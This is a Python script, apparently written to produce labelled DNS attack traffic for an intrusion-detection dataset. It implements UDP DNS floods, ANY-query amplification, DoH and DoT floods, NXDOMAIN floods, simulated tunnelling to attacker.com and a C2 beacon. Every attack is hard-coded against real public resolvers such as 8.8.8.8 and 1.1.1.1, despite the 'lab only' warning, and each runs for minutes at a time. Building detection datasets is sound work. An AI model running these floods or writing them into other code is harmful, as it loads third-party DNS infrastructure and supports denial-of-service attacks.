"""
generate_real_dns_attacks.py — Generates REAL DNS attack network traffic

PURPOSE:
  Produces traffic that the CIC-Flow-Meter-DNS tool actually captures,
  creating flow records with genuine attack-level feature values:
  - High bwd_packets_per_sec (model's #1 feature)
  - High dns_queries_per_second
  - High flow_bytes_per_sec
  - Large bwd_packet_length_mean (amplification)

ATTACK TYPES:
  1. UDP DNS Flood         — Massive queries to port 53 (volumetric)
  2. DNS Amplification     — ANY queries to public resolvers (bandwidth amplification)
  3. Rapid DoH Flood       — HTTP POST flood to DoH servers (DoH DDoS)
  4. DoT Flood             — TLS connection flood to port 853
  5. DNS Tunneling         — Data encoded in long subdomains
  6. NXDOMAIN Attack       — Random non-existent domains (cache poisoning / resource exhaustion)
  7. Slow DNS Beacon       — Low-and-slow C2 heartbeat pattern

USAGE:
  # Run WHILE the capture tool is running
  python generate_real_dns_attacks.py --attack all      --duration 5
  python generate_real_dns_attacks.py --attack flood    --duration 3
  python generate_real_dns_attacks.py --attack amplify  --duration 3
  python generate_real_dns_attacks.py --attack tunnel   --duration 3
  python generate_real_dns_attacks.py --attack doh      --duration 3
  python generate_real_dns_attacks.py --attack nxdomain --duration 3
  python generate_real_dns_attacks.py --attack beacon   --duration 3

WARNING: Run ONLY in a lab environment. Do not use on production networks.
"""

import argparse
import random
import socket
import ssl
import string
import time
import struct
import _thread
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    from dnslib import DNSRecord, QTYPE, RR, A
    HAS_DNSLIB = True
except ImportError:
    HAS_DNSLIB = False
    print("[WARN] dnslib not found. Install with: pip install dnslib")

# ─── TARGETS ──────────────────────────────────────────────────────────────────
DNS_TARGETS = [
    "8.8.8.8",    # Google DNS
    "1.1.1.1",    # Cloudflare DNS
    "9.9.9.9",    # Quad9
    "8.8.4.4",    # Google secondary
]

DOH_TARGETS = [
    "https://8.8.8.8/dns-query",
    "https://1.1.1.1/dns-query",
    "https://9.9.9.9/dns-query",
]

DOT_TARGETS = [
    ("8.8.8.8",  853),
    ("1.1.1.1",  853),
    ("9.9.9.9",  853),
]

DNS_PORT = 53

# High-traffic domains for amplification (have large ANY responses)
AMPLIFY_DOMAINS = [
    "google.com", "cloudflare.com", "akamai.com",
    "amazon.com", "microsoft.com", "isc.org", "iana.org",
]

# ─── DNS PACKET BUILDER ───────────────────────────────────────────────────────

def build_dns_query(domain, qtype=1):
    """Build a raw DNS UDP query packet. qtype: 1=A, 28=AAAA, 255=ANY."""
    txid   = random.randint(0, 65535)
    flags  = 0x0100  # Standard query, recursion desired
    header = struct.pack(">HHHHHH", txid, flags, 1, 0, 0, 0)
    question = b""
    for part in domain.split("."):
        question += bytes([len(part)]) + part.encode()
    question += b"\x00"
    question += struct.pack(">HH", qtype, 1)  # qtype, IN class
    return header + question


def send_udp_query(domain, target_ip, qtype=1):
    """Send a single UDP DNS query."""
    try:
        pkt = build_dns_query(domain, qtype)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.3)
        s.sendto(pkt, (target_ip, DNS_PORT))
        s.recv(4096)
        s.close()
    except Exception:
        try:
            s.close()
        except Exception:
            pass


# ─── ATTACK 1: UDP DNS FLOOD ──────────────────────────────────────────────────

def attack_udp_flood(duration, stop_flag):
    """
    HIGH bwd_packets_per_sec, HIGH flow_packets_per_sec
    Sends thousands of DNS A queries per second.
    """
    print("[FLOOD] Starting UDP DNS Flood...")
    end = time.time() + duration
    sent = 0
    while time.time() < end and not stop_flag[0]:
        domain = f"flood-{random.randint(1,99999)}.example.com"
        target = random.choice(DNS_TARGETS)
        send_udp_query(domain, target, qtype=1)
        sent += 1
    print(f"[FLOOD] Sent {sent:,} UDP flood queries")


# ─── ATTACK 2: DNS AMPLIFICATION ──────────────────────────────────────────────

def attack_amplification(duration, stop_flag):
    """
    HIGH bwd_packet_length_mean, HIGH flow_bytes_per_sec
    ANY queries return very large responses (10-100x amplification).
    """
    print("[AMPLIFY] Starting DNS Amplification...")
    end = time.time() + duration
    sent = 0
    while time.time() < end and not stop_flag[0]:
        domain  = random.choice(AMPLIFY_DOMAINS)
        target  = random.choice(DNS_TARGETS)
        send_udp_query(domain, target, qtype=255)  # 255 = ANY
        sent += 1
    print(f"[AMPLIFY] Sent {sent:,} ANY queries")


# ─── ATTACK 3: DoH FLOOD ──────────────────────────────────────────────────────

def attack_doh_flood(duration, stop_flag):
    """
    HIGH flow_packets_per_sec on HTTPS/443, HIGH dns_queries_per_second
    Rapidly POSTs binary DNS messages to DoH servers.
    """
    if not HAS_DNSLIB:
        print("[DOH] Skipped — dnslib not installed")
        return
    print("[DOH-FLOOD] Starting DoH Flood...")
    headers = {"Content-Type": "application/dns-message",
               "Accept":       "application/dns-message"}
    end  = time.time() + duration
    sent = 0
    while time.time() < end and not stop_flag[0]:
        domain = f"doh-flood-{random.randint(1, 999999)}.malicious.net"
        try:
            q      = DNSRecord.question(domain, "A")
            data   = q.pack()
            target = random.choice(DOH_TARGETS)
            requests.post(target, data=data, headers=headers,
                          timeout=2, verify=False)
            sent += 1
        except Exception:
            pass
    print(f"[DOH-FLOOD] Sent {sent:,} DoH flood requests")


# ─── ATTACK 4: DoT FLOOD ──────────────────────────────────────────────────────

def attack_dot_flood(duration, stop_flag):
    """
    HIGH flow_packets_per_sec on TLS/853
    Rapid DNS-over-TLS connection establishment + query flood.
    """
    if not HAS_DNSLIB:
        print("[DOT] Skipped — dnslib not installed")
        return
    print("[DOT-FLOOD] Starting DoT Flood...")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    end  = time.time() + duration
    sent = 0
    while time.time() < end and not stop_flag[0]:
        domain = f"dot-attack-{random.randint(1, 999999)}.evil.com"
        try:
            q      = DNSRecord.question(domain, "A")
            data   = q.pack()
            length = len(data).to_bytes(2, "big")
            ip, port = random.choice(DOT_TARGETS)
            with socket.create_connection((ip, port), timeout=2) as raw:
                with ctx.wrap_socket(raw, server_hostname=ip) as tls:
                    tls.sendall(length + data)
                    tls.recv(4096)
            sent += 1
        except Exception:
            pass
    print(f"[DOT-FLOOD] Sent {sent:,} DoT flood queries")


# ─── ATTACK 5: DNS TUNNELING ──────────────────────────────────────────────────

def attack_dns_tunnel(duration, stop_flag):
    """
    HIGH query_response_ratio, HIGH sni_entropy
    Encodes fake data in very long subdomain labels (exfiltration simulation).
    """
    print("[TUNNEL] Starting DNS Tunneling simulation...")
    end  = time.time() + duration
    sent = 0
    TUNNEL_DOMAIN = "tunnel-c2.attacker.com"
    while time.time() < end and not stop_flag[0]:
        # Encode 40 bytes of "data" as hex in subdomain
        payload = "".join(random.choices(string.hexdigits, k=40))
        chunk1  = payload[:20]
        chunk2  = payload[20:]
        domain  = f"{chunk1}.{chunk2}.{TUNNEL_DOMAIN}"
        target  = random.choice(DNS_TARGETS)
        send_udp_query(domain, target, qtype=16)  # TXT record
        sent += 1
        time.sleep(random.uniform(0.01, 0.1))  # Slow enough to form flows
    print(f"[TUNNEL] Sent {sent:,} tunneled queries")


# ─── ATTACK 6: NXDOMAIN FLOOD ─────────────────────────────────────────────────

def attack_nxdomain(duration, stop_flag):
    """
    HIGH dns_total_queries, HIGH NXDOMAIN response ratio
    Floods resolver with random non-existent domains to exhaust NXDOMAIN cache.
    """
    print("[NXDOMAIN] Starting NXDOMAIN Flood...")
    end  = time.time() + duration
    sent = 0
    while time.time() < end and not stop_flag[0]:
        # Random 12-char domain that doesn't exist
        label  = "".join(random.choices(string.ascii_lowercase, k=12))
        domain = f"{label}.definitely-does-not-exist-{random.randint(1,9999)}.com"
        target = random.choice(DNS_TARGETS)
        send_udp_query(domain, target, qtype=1)
        sent += 1
    print(f"[NXDOMAIN] Sent {sent:,} NXDOMAIN queries")


# ─── ATTACK 7: SLOW BEACON (C2 Heartbeat) ────────────────────────────────────

def attack_slow_beacon(duration, stop_flag):
    """
    Periodic, low-volume encrypted lookups — simulates C2 beaconing.
    Detectable via regular inter-arrival time pattern.
    Uses DoH to simulate stealthy C2 over HTTPS.
    """
    if not HAS_DNSLIB:
        print("[BEACON] Skipped — dnslib not installed")
        return
    print("[BEACON] Starting Slow C2 Beacon simulation...")
    headers = {"Content-Type": "application/dns-message",
               "Accept":       "application/dns-message"}
    end    = time.time() + duration
    count  = 0
    BEACON_INTERVAL = 2.0   # Every 2 seconds — very regular (suspicious)
    C2_DOMAIN       = "c2-heartbeat.attacker-c2.net"
    while time.time() < end and not stop_flag[0]:
        try:
            q    = DNSRecord.question(C2_DOMAIN, "A")
            data = q.pack()
            requests.post(DOH_TARGETS[0], data=data, headers=headers,
                          timeout=3, verify=False)
            count += 1
            print(f"  [BEACON] Heartbeat #{count}")
        except Exception:
            pass
        time.sleep(BEACON_INTERVAL)   # Rigid interval = detectable
    print(f"[BEACON] Sent {count} beacon pulses")


# ─── MAIN ─────────────────────────────────────────────────────────────────────

ATTACKS = {
    "flood":    attack_udp_flood,
    "amplify":  attack_amplification,
    "doh":      attack_doh_flood,
    "dot":      attack_dot_flood,
    "tunnel":   attack_dns_tunnel,
    "nxdomain": attack_nxdomain,
    "beacon":   attack_slow_beacon,
}

def main():
    parser = argparse.ArgumentParser(
        description="Real DNS Attack Traffic Generator — for lab capture")
    parser.add_argument("--attack",   choices=list(ATTACKS.keys()) + ["all"],
                        default="all", help="Attack type to run")
    parser.add_argument("--duration", type=int, default=5,
                        help="Duration in MINUTES per attack (default: 5)")
    args = parser.parse_args()

    dur_secs  = args.duration * 60
    stop_flag = [False]

    print("=" * 65)
    print("  REAL DNS ATTACK TRAFFIC GENERATOR")
    print(f"  Attack   : {args.attack.upper()}")
    print(f"  Duration : {args.duration} min per attack")
    print("  [!] Run your capture tool NOW before this script")
    print("=" * 65)
    time.sleep(3)   # Give user time to confirm tool is running

    if args.attack == "all":
        # Run each attack sequentially for full_duration each
        for name, fn in ATTACKS.items():
            if stop_flag[0]:
                break
            print(f"\n{'='*50}")
            print(f"  >>> LAUNCHING: {name.upper()} ({args.duration} min) <<<")
            print(f"{'='*50}")
            fn(dur_secs, stop_flag)
            print(f"  [PAUSE] 10s cooldown before next attack...\n")
            time.sleep(10)
    else:
        fn = ATTACKS[args.attack]
        fn(dur_secs, stop_flag)

    print("\n" + "=" * 65)
    print("  ALL ATTACKS COMPLETE. Stop your capture tool now.")
    print("  Label the output CSV with: label=ATTACK")
    print("=" * 65)


if __name__ == "__main__":
    main()
